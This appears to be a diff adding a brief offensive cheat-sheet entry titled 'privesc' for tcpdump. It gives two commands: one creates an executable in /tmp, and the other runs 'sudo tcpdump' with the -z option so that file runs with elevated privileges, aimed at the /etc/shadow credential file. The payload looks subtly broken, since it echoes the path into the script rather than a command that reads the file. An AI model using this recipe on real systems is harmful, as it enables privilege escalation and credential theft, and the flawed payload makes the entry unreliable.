@@ -1,0 +1,6 @@
+# tcpdump
+
+# privesc
+$ echo /etc/shadow > /tmp/lol; chmod +x /tmp/lol
+$ sudo tcpdump -ln -i em1 -w /tmp/blah.cap -c 100 -G 1 -z /tmp/lol
+
